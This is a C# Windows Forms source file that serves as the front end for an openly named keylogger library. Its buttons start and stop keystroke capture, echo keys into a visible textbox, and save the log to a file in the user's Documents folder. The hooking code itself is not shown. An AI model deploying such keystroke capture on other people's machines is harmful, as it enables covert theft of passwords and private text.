using Byte_Simple_Keylogger.Keylogger;

namespace Byte_Simple_Keylogger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Task.Run(() =>
            {
                if (Simple_Keylogger.FirstStart)
                {
                    // Event handler for key presses
                    Simple_Keylogger.KeyPressed += (s, args) =>
                    {
                        Console.WriteLine($"Pressed key: {args.Key}");

                        // Update keylogger output
                        Simple_Keylogger.KeyloggerOutput += args.Key;

                        // Update the textbox on the UI thread
                        textBox1.BeginInvoke(new Action(() => textBox1.Text += args.Key));
                    };
                }

                // Start the keylogger
                Simple_Keylogger.Start();
            });
        }

        private void button2_Click(object sender, EventArgs e)
        {
            // Stop the keylogger
            Simple_Keylogger.Stop();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            // Specify the path to save the log file
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "log.txt");

            // Save the log
            Simple_Keylogger.SaveLog(path);

            // Show a message box with the path of the saved log file
            MessageBox.Show($"Save is successful.\nLog file path: {path}");
        }
     
    }
}